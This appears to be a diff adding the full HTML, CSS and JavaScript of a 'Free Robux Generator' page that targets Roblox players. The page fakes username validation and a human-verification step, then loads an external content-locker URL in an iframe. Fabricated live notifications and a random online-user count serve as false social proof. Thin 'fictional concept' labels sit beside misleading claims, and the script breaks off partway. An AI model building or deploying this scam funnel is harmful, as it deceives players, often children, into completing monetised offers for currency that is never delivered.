@@ -1,0 +1,1373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Generator | Fictional Concept</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&family=Oxanium:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00b3ff;
+            --secondary: #00ff88;
+            --dark-bg: #0a0e17;
+            --dark-card: #131a2c;
+            --text-light: #f0f8ff;
+            --text-gray: #a0b3d9;
+            --danger: #ff4757;
+            --warning: #ffaa00;
+            --success: #00d56f;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: var(--dark-bg);
+            color: var(--text-light);
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header & Navigation */
+        header {
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(0, 179, 255, 0.1);
+            position: relative;
+            z-index: 100;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-image {
+            height: 50px;
+            width: auto;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 179, 255, 0.3);
+        }
+
+        .logo-text {
+            font-family: 'Oxanium', monospace;
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        .logo-text span {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        /* Hero Section with Image Background */
+        .hero {
+            padding: 80px 0 60px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            min-height: 600px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .hero-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            overflow: hidden;
+        }
+
+        .hero-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            opacity: 0.15;
+            filter: blur(2px) brightness(0.7);
+        }
+
+        .hero-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(10, 14, 23, 0.9), rgba(10, 14, 23, 0.7));
+            z-index: -1;
+        }
+
+        .hero-content {
+            max-width: 800px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .hero h1 {
+            font-family: 'Oxanium', monospace;
+            font-size: 3.5rem;
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 5px 15px rgba(0, 179, 255, 0.2);
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-gray);
+            max-width: 700px;
+            margin: 0 auto 40px;
+        }
+
+        .highlight {
+            color: var(--secondary);
+            font-weight: 600;
+        }
+
+        .hero-image-preview {
+            width: 300px;
+            height: auto;
+            border-radius: 15px;
+            margin: 30px auto;
+            border: 3px solid var(--primary);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 0 0 40px rgba(0, 179, 255, 0.3);
+            display: block;
+        }
+
+        /* Floating Robux Icons */
+        .floating-elements {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .robox-icon {
+            position: absolute;
+            opacity: 0.4;
+            animation: float 6s infinite ease-in-out;
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 8px rgba(0, 179, 255, 0.5));
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(10deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        /* Steps Container */
+        .steps-container {
+            max-width: 800px;
+            margin: 0 auto 60px;
+        }
+
+        .step {
+            background: rgba(19, 26, 44, 0.7);
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(0, 179, 255, 0.1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .step:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 179, 255, 0.1);
+        }
+
+        .step-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+
+        .step-number {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 50%;
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin-right: 15px;
+        }
+
+        .step-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-gray);
+            font-weight: 600;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(10, 14, 23, 0.8);
+            border: 2px solid rgba(0, 179, 255, 0.2);
+            border-radius: 10px;
+            color: var(--text-light);
+            font-size: 1rem;
+            font-family: 'Montserrat', sans-serif;
+            transition: all 0.3s;
+            direction: ltr;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 179, 255, 0.2);
+        }
+
+        .validation-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.2rem;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0, 179, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s linear infinite;
+            opacity: 0;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 16px 32px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: var(--dark-bg);
+            border: none;
+            border-radius: 10px;
+            font-family: 'Oxanium', monospace;
+            font-size: 1.1rem;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 179, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 179, 255, 0.6);
+        }
+
+        .btn:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-glow {
+            animation: glow 2s infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 5px 15px rgba(0, 179, 255, 0.4); }
+            to { box-shadow: 0 5px 20px rgba(0, 179, 255, 0.8), 0 0 30px rgba(0, 179, 255, 0.3); }
+        }
+
+        /* Verification Section */
+        .verification-card {
+            background: linear-gradient(145deg, rgba(19, 26, 44, 0.9), rgba(10, 14, 23, 0.9));
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            border: 1px solid rgba(0, 179, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verification-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 179, 255, 0.05) 0%, rgba(0, 179, 255, 0) 70%);
+            z-index: -1;
+        }
+
+        .trust-elements {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 25px 0;
+            flex-wrap: wrap;
+        }
+
+        .trust-element {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .trust-icon {
+            font-size: 1.8rem;
+            color: var(--secondary);
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 10px;
+            background: rgba(10, 14, 23, 0.8);
+            border-radius: 5px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            border-radius: 5px;
+            transition: width 2s ease-in-out;
+        }
+
+        /* Content Locker Styles */
+        .content-locker-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(15px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s, visibility 0.5s;
+        }
+
+        .content-locker-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .content-locker-container {
+            width: 95%;
+            max-width: 800px;
+            height: 85vh;
+            background: linear-gradient(145deg, #131a2c, #0a0e17);
+            border-radius: 20px;
+            border: 2px solid rgba(0, 179, 255, 0.3);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8), 0 0 80px rgba(0, 179, 255, 0.2);
+            overflow: hidden;
+            transform: scale(0.9);
+            opacity: 0;
+            transition: transform 0.5s, opacity 0.5s;
+            position: relative;
+        }
+
+        .content-locker-overlay.active .content-locker-container {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .content-locker-header {
+            padding: 25px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.3);
+            border-bottom: 1px solid rgba(0, 179, 255, 0.2);
+        }
+
+        .content-locker-header h2 {
+            font-family: 'Oxanium', monospace;
+            font-size: 1.8rem;
+            color: var(--secondary);
+            margin-bottom: 10px;
+        }
+
+        .content-locker-header p {
+            color: var(--text-gray);
+            font-size: 0.95rem;
+        }
+
+        .content-locker-body {
+            height: calc(100% - 120px);
+            width: 100%;
+            position: relative;
+        }
+
+        .content-locker-iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: white;
+        }
+
+        .content-locker-loader {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 10;
+        }
+
+        .content-locker-loader .spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid rgba(0, 179, 255, 0.1);
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            margin: 0 auto 25px;
+            animation: spin 1.5s linear infinite;
+        }
+
+        .close-content-locker {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 71, 87, 0.1);
+            color: var(--danger);
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            font-size: 1.2rem;
+            cursor: pointer;
+            opacity: 0.9;
+            z-index: 2001;
+            transition: all 0.3s;
+        }
+
+        .close-content-locker:hover {
+            background: rgba(255, 71, 87, 0.2);
+            transform: scale(1.1);
+        }
+
+        /* Live Activity Notifications */
+        .notification-container {
+            position: fixed;
+            top: 100px;
+            right: 20px;
+            z-index: 999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-width: 320px;
+            pointer-events: none;
+        }
+
+        .notification {
+            background: linear-gradient(135deg, rgba(19, 26, 44, 0.95), rgba(10, 14, 23, 0.95));
+            border-left: 4px solid var(--primary);
+            border-radius: 10px;
+            padding: 15px 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3), 0 0 20px rgba(0, 179, 255, 0.1);
+            backdrop-filter: blur(10px);
+            transform: translateX(400px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.5s;
+            pointer-events: auto;
+            position: relative;
+            overflow: hidden;
+            max-width: 320px;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+            opacity: 1;
+        }
+
+        .notification.hide {
+            transform: translateX(400px);
+            opacity: 0;
+        }
+
+        .notification::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, rgba(0, 179, 255, 0.05) 0%, transparent 100%);
+            z-index: -1;
+        }
+
+        .notification-content {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .notification-icon {
+            font-size: 1.2rem;
+            color: var(--primary);
+            animation: pulse 2s infinite;
+        }
+
+        .notification-text {
+            flex: 1;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+
+        .notification-text strong {
+            color: var(--secondary);
+            font-weight: 600;
+        }
+
+        .notification-close {
+            background: transparent;
+            border: none;
+            color: var(--text-gray);
+            font-size: 0.8rem;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+            transition: all 0.3s;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .notification-close:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-light);
+        }
+
+        .notification-progress {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 3px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            overflow: hidden;
+        }
+
+        .notification-progress-bar {
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            transform: translateX(-100%);
+        }
+
+        .notification.slide-out {
+            animation: slideOut 0.5s forwards;
+        }
+
+        @keyframes slideOut {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+        }
+
+        /* System Status Bar */
+        .system-status {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 100;
+            background: rgba(19, 26, 44, 0.8);
+            border-radius: 10px;
+            padding: 10px 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 179, 255, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .status-indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: var(--success);
+            animation: statusPulse 2s infinite;
+        }
+
+        @keyframes statusPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .status-text {
+            color: var(--text-gray);
+        }
+
+        .user-count {
+            color: var(--secondary);
+            font-weight: 600;
+        }
+
+        /* Footer */
+        footer {
+            padding: 40px 0 30px;
+            border-top: 1px solid rgba(0, 179, 255, 0.1);
+            text-align: center;
+        }
+
+        .disclaimer {
+            max-width: 800px;
+            margin: 0 auto 30px;
+            padding: 20px;
+            background: rgba(255, 71, 87, 0.05);
+            border-radius: 10px;
+            border-left: 4px solid var(--danger);
+        }
+
+        .disclaimer h3 {
+            color: var(--danger);
+            margin-bottom: 10px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+
+        .footer-link {
+            color: var(--text-gray);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-link:hover {
+            color: var(--primary);
+        }
+
+        .copyright {
+            color: var(--text-gray);
+            font-size: 0.9rem;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .hero {
+                min-height: 500px;
+                padding: 60px 0 40px;
+            }
+            
+            .hero-image-preview {
+                width: 250px;
+            }
+            
+            .logo-image {
+                height: 40px;
+            }
+            
+            .logo-text {
+                font-size: 1.5rem;
+            }
+            
+            .step {
+                padding: 25px 20px;
+            }
+            
+            .trust-elements {
+                gap: 20px;
+            }
+            
+            .content-locker-container {
+                width: 98%;
+                max-width: 95%;
+                height: 90vh;
+            }
+            
+            .notification-container {
+                top: 80px;
+                right: 10px;
+                max-width: 280px;
+            }
+            
+            .notification {
+                padding: 12px 15px;
+                max-width: 280px;
+            }
+            
+            .system-status {
+                bottom: 10px;
+                left: 10px;
+                right: 10px;
+                justify-content: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            .hero-image-preview {
+                width: 200px;
+            }
+            
+            .step-title {
+                font-size: 1.3rem;
+            }
+            
+            .logo-container {
+                flex-direction: column;
+                gap: 10px;
+                align-items: flex-start;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .content-locker-header h2 {
+                font-size: 1.5rem;
+            }
+            
+            .notification-container {
+                top: 70px;
+                max-width: 250px;
+            }
+            
+            .notification {
+                max-width: 250px;
+                padding: 10px 12px;
+            }
+            
+            .notification-text {
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Floating Elements Background -->
+    <div class="floating-elements" id="floatingElements"></div>
+    
+    <!-- Live Activity Notifications Container -->
+    <div class="notification-container" id="notificationContainer"></div>
+    
+    <!-- System Status Indicator -->
+    <div class="system-status">
+        <div class="status-indicator"></div>
+        <div class="status-text">System Active • <span class="user-count" id="userCount">0</span> users online</div>
+    </div>
+    
+    <header>
+        <div class="container">
+            <div class="logo-container">
+                <img src="https://i.pinimg.com/736x/09/7d/d5/097dd55fa9acbd343eac684246e0f1c2.jpg" alt="Robux Generator Logo" class="logo-image">
+                <div class="logo-text">
+                    <span>RobuxGenerator</span> <small style="font-size: 0.8rem; color: var(--text-gray);"></small>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <!-- Hero Section with Background Image -->
+        <section class="hero">
+            <div class="hero-background">
+                <img src="https://i.pinimg.com/736x/09/7d/d5/097dd55fa9acbd343eac684246e0f1c2.jpg" alt="Robux Background" class="hero-image">
+                <div class="hero-overlay"></div>
+            </div>
+            
+            <div class="container">
+                <div class="hero-content">
+                    <h1>Get Free Robux</h1>
+                    <p>🎁 Get Free Robux & Level Up Your Game! <span class="highlight">Join thousands of Roblox players unlocking exclusive rewards.</span> Just enter your username and verify to proceed. No downloads • Simple steps • 100% online</p>
+                    
+                    <img src="https://i.pinimg.com/1200x/dd/f3/b3/ddf3b30d55e9931d4da6042d6ecb0272.jpg" alt="Robux Preview" class="hero-image-preview">
+                    
+                    <p>Interact with the interface below and discover how premium Robux access is processed.</p>
+                </div>
+            </div>
+        </section>
+
+        <div class="container">
+            <div class="steps-container">
+                <!-- Step 1: Username -->
+                <div class="step" id="step1">
+                    <div class="step-header">
+                        <div class="step-number">1</div>
+                        <h2 class="step-title">Enter Your Roblox Username</h2>
+                    </div>
+                    <div class="form-group">
+                        <label class="input-label">Roblox Username</label>
+                        <div class="input-wrapper">
+                            <input type="text" class="input-field" id="usernameInput" placeholder="e.g. RobloxPlayer123" maxlength="20">
+                            <div class="validation-icon" id="validationIcon">
+                                <i class="fas fa-check-circle" style="color: var(--success);"></i>
+                            </div>
+                            <div class="validation-icon" id="loadingSpinner">
+                                <div class="loading-spinner"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="btn" id="continueBtn">Continue</button>
+                </div>
+
+                <!-- Step 2: Verification -->
+                <div class="step" id="step2" style="display: none;">
+                    <div class="step-header">
+                        <div class="step-number">2</div>
+                        <h2 class="step-title">Verification Required</h2>
+                    </div>
+                    
+                    <div class="verification-card">
+                        <p>Verification is required to protect users from bots and ensure fair access to resources. This is a demo simulation of a security verification process.</p>
+                        
+                        <div class="trust-elements">
+                            <div class="trust-element">
+                                <i class="fas fa-shield-alt trust-icon"></i>
+                                <span>Security Check</span>
+                            </div>
+                            <div class="trust-element">
+                                <i class="fas fa-robot trust-icon"></i>
+                                <span>Bot Protection</span>
+                            </div>
+                            <div class="trust-element">
+                                <i class="fas fa-user-check trust-icon"></i>
+                                <span>Human Verification</span>
+                            </div>
+                        </div>
+                        
+                        <div class="progress-container">
+                            <div class="progress-bar" id="progressBar"></div>
+                        </div>
+                        
+                        <p class="highlight">Click the button below to simulate verification</p>
+                        
+                        <button class="btn btn-glow" id="verifyBtn">
+                            <i class="fas fa-user-shield"></i> Verify Now
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Content Locker Modal -->
+    <div class="content-locker-overlay" id="contentLockerOverlay">
+        <div class="content-locker-container">
+            <button class="close-content-locker" id="closeContentLocker" title="Close">
+                <i class="fas fa-times"></i>
+            </button>
+            
+            <div class="content-locker-header">
+                <h2>Complete Verification to Continue</h2>
+                <p>Complete one simple step to verify you're human (Simulation)</p>
+            </div>
+            
+            <div class="content-locker-body">
+                <div class="content-locker-loader" id="contentLockerLoader">
+                    <div class="spinner"></div>
+                    <p>Loading verification task... Please wait</p>
+                </div>
+                <iframe 
+                    id="contentLockerIframe" 
+                    class="content-locker-iframe" 
+                    src="" 
+                    frameborder="0" 
+                    allowfullscreen
+                    style="display: none;"
+                ></iframe>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="disclaimer">
+                <h3><i class="fas fa-exclamation-triangle"></i> Important Disclaimer</h3>
+                <p>This interface is <strong>crafted for players</strong> seeking a smarter, more engaging Roblox experience.</p>
+            </div>
+            
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Contact</a>
+            </div>
+            
+            <p class="copyright">© 2023 Robux Generator Concept. This is a fictional UI demonstration.</p>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Create floating Robux image elements in background
+            const floatingContainer = document.getElementById('floatingElements');
+            
+            for (let i = 0; i < 8; i++) {
+                const img = document.createElement('img');
+                img.src = 'https://i.pinimg.com/736x/09/7d/d5/097dd55fa9acbd343eac684246e0f1c2.jpg';
+                img.className = 'robox-icon';
+                img.alt = 'Robux icon';
+                
+                // Random positioning
+                img.style.left = `${Math.random() * 100}%`;
+                img.style.top = `${Math.random() * 100}%`;
+                
+                // Random size
+                const size = Math.random() * 40 + 40;
+                img.style.width = `${size}px`;
+                img.style.height = `${size}px`;
+                
+                // Random animation delay and duration
+                img.style.animationDelay = `${Math.random() * 5}s`;
+                img.style.animationDuration = `${Math.random() * 4 + 4}s`;
+                
+                // Random opacity
+                img.style.opacity = Math.random() * 0.3 + 0.2;
+                
+                floatingContainer.appendChild(img);
+            }
+            
+            // Step 1: Username input validation
+            const usernameInput = document.getElementById('usernameInput');
+            const validationIcon = document.getElementById('validationIcon');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const continueBtn = document.getElementById('continueBtn');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            
+            let usernameValid = false;
+            
+            usernameInput.addEventListener('input', function() {
+                const username = usernameInput.value.trim();
+                
+                if (username.length < 3) {
+                    validationIcon.style.opacity = '0';
+                    loadingSpinner.style.opacity = '0';
+                    usernameValid = false;
+                    continueBtn.style.opacity = '0.7';
+                    return;
+                }
+                
+                // Show loading spinner
+                validationIcon.style.opacity = '0';
+                loadingSpinner.style.opacity = '1';
+                
+                // Simulate validation after delay
+                setTimeout(() => {
+                    loadingSpinner.style.opacity = '0';
+                    
+                    // For demo purposes, accept any username with at least 3 chars
+                    if (username.length >= 3) {
+                        validationIcon.style.opacity = '1';
+                        usernameValid = true;
+                        continueBtn.style.opacity = '1';
+                        
+                        // Add a subtle animation to the checkmark
+                        validationIcon.style.transform = 'translateY(-50%) scale(1.2)';
+                        setTimeout(() => {
+                            validationIcon.style.transform = 'translateY(-50%) scale(1)';
+                        }, 300);
+                    }
+                }, 800);
+            });
+            
+            continueBtn.addEventListener('click', function() {
+                if (!usernameValid) {
+                    // Shake animation for invalid input
+                    usernameInput.style.borderColor = 'var(--danger)';
+                    usernameInput.style.animation = 'none';
+                    setTimeout(() => {
+                        usernameInput.style.animation = 'shake 0.5s';
+                    }, 10);
+                    
+                    setTimeout(() => {
+                        usernameInput.style.borderColor = 'rgba(0, 179, 255, 0.2)';
+                    }, 500);
+                    return;
+                }
+                
+                // Transition to step 2
+                step1.style.opacity = '0.5';
+                step1.style.pointerEvents = 'none';
+                
+                setTimeout(() => {
+                    step1.style.display = 'none';
+                    step2.style.display = 'block';
+                    
+                    // Animate step 2 appearance
+                    step2.style.opacity = '0';
+                    step2.style.transform = 'translateY(20px)';
+                    
+                    setTimeout(() => {
+                        step2.style.transition = 'opacity 0.5s, transform 0.5s';
+                        step2.style.opacity = '1';
+                        step2.style.transform = 'translateY(0)';
+                    }, 10);
+                    
+                    // Animate progress bar
+                    const progressBar = document.getElementById('progressBar');
+                    setTimeout(() => {
+                        progressBar.style.width = '100%';
+                    }, 500);
+                }, 300);
+            });
+            
+            // Step 2: Verification button - Load Content Locker
+            const verifyBtn = document.getElementById('verifyBtn');
+            const contentLockerOverlay = document.getElementById('contentLockerOverlay');
+            const closeContentLocker = document.getElementById('closeContentLocker');
+            const contentLockerIframe = document.getElementById('contentLockerIframe');
+            const contentLockerLoader = document.getElementById('contentLockerLoader');
+            
+            verifyBtn.addEventListener('click', function() {
+                // Show content locker overlay
+                contentLockerOverlay.classList.add('active');
+                
+                // Prevent scrolling when overlay is open
+                document.body.style.overflow = 'hidden';
+                
+                // Load the external content locker URL after a short delay
+                setTimeout(() => {
+                    const lockerUrl = 'https://d1y3y09sav47f5.cloudfront.net/public/locker.php?it=4409340&key=7a8e5';
+                    contentLockerIframe.src = lockerUrl;
+                    
+                    // Show loading indicator
+                    contentLockerLoader.style.display = 'block';
+                    contentLockerIframe.style.display = 'none';
+                    
+                    // When iframe loads, hide the loader
+                    contentLockerIframe.onload = function() {
+                        setTimeout(() => {
+                            contentLockerLoader.style.display = 'none';
+                            contentLockerIframe.style.display = 'block';
+                        }, 1000);
+                    };
+                    
+                    // Handle iframe loading errors
+                    contentLockerIframe.onerror = function() {
+                        contentLockerLoader.innerHTML = `
+                            <div style="color: var(--danger);">
+                                <i class="fas fa-exclamation-triangle" style="font-size: 3rem; margin-bottom: 20px;"></i>
+                                <h3>Failed to Load Verification System</h3>
+                                <p>An error occurred while loading the verification system. Please try again later.</p>
+                                <p><small>This is expected in the demo environment.</small></p>
+                            </div>
+                        `;
+                    };
+                }, 500);
+            });
+            
+            // Close content locker
+            closeContentLocker.addEventListener('click', function() {
+                contentLockerOverlay.classList.remove('active');
+                contentLockerIframe.src = '';
+                document.body.style.overflow = 'auto';
+                
+                // Reset loader for next time
+                contentLockerLoader.innerHTML = `
+                    <div class="spinner"></div>
+                    <p>Loading verification task... Please wait</p>
+                `;
+                contentLockerLoader.style.display = 'block';
+                contentLockerIframe.style.display = 'none';
+            });
+            
+            // Close content locker when clicking outside
+            contentLockerOverlay.addEventListener('click', function(e) {
+                if (e.target === contentLockerOverlay) {
+                    contentLockerOverlay.classList.remove('active');
+                    contentLockerIframe.src = '';
+                    document.body.style.overflow = 'auto';
+                    
+                    // Reset loader for next time
+                    contentLockerLoader.innerHTML = `
+                        <div class="spinner"></div>
+                        <p>Loading verification task... Please wait</p>
+                    `;
+                    contentLockerLoader.style.display = 'block';
+                    contentLockerIframe.style.display = 'none';
+                }
+            });
+            
+            // Add shake animation for invalid actions
+            const styleSheet = document.createElement('style');
+            styleSheet.innerHTML = `
+                @keyframes shake {
+                    0%, 100% { transform: translateX(0); }
+                    10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+                    20%, 40%, 60%, 80% { transform: translateX(5px); }
+                }
+            `;
+            document.head.appendChild(styleSheet);
+            
+            // Add some random interaction effects
+            document.querySelectorAll('.btn').forEach(btn => {
+                btn.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-3px)';
+                });
+                
+                btn.addEventListener('mouseleave', function() {
+                    if (!this.classList.contains('btn-glow') || this.id !== 'verifyBtn') {
+                        this.style.transform = 'translateY(0)';
+                    }
+                });
+            });
+            
+            // Live Activity Notification System
+            const notificationContainer = document.getElementById('notificationContainer');
+            const userCountElement = document.getElementById('userCount');
+            
+            // List of realistic notification messages
+            const notifications = [
+                { icon: '🔔', message: 'Player <strong>John</strong> connected successfully' },
+                { icon: '🔔', message: '<strong>Emma</strong> just joined the system' },
+                { icon: '🔔', message: 'New player interaction detected' },
+                { icon: '👤', message: '<strong>Alex</strong> verified and continued' },
+                { icon: '🚀', message: '<strong>Michael</strong> just completed verification' },
+                { icon: '✅', message: '<strong>Sarah</strong> successfully connected' },
+                { icon: '⚡', message: 'System processing new request' },
+                { icon: '👥', message: '<strong>David</strong> and <strong>Lisa</strong> active' },
+                { icon: '🎮', message: '<strong>Player123</strong> accessing rewards' },
+                { icon: '🔒', message: 'Security check passed for <strong>Jake</strong>' }
+            ];
+            
+            // Random Roblox usernames for more variety
+            const robloxUsernames = [
+                'ProGamerX', 'RobloxMaster', 'NinjaPlayer', 'EpicBuilder', 'CoolAvatar',
+                'GameChanger', 'AdventureSeeker', 'CreativeMind', 'SpeedRunner', 'LegendaryPlayer',
+                'MegaBuilder', 'SuperStar', 'UltimateGamer', 'PixelArtist', 'RobloxWizard'
+            ];
+            
+            let activeNotifications = 0;
+            let onlineUsers = Math.floor(Math.random() * 50) + 20; // Random user count between 20-70
+            
+            // Initialize user count
+            userCountElement.textContent = onlineUsers;
+            
+            // Function to create and show a notification
+            function showNotification() {
+                if (activeNotifications >= 3) return; // Limit to 3 notifications at once
+                
+                activeNotifications++;
+                
+                // Randomly select or create a notification
+                let notification;
+                if (Math.random() > 0.3) {
+                    // Use predefined notification with random username
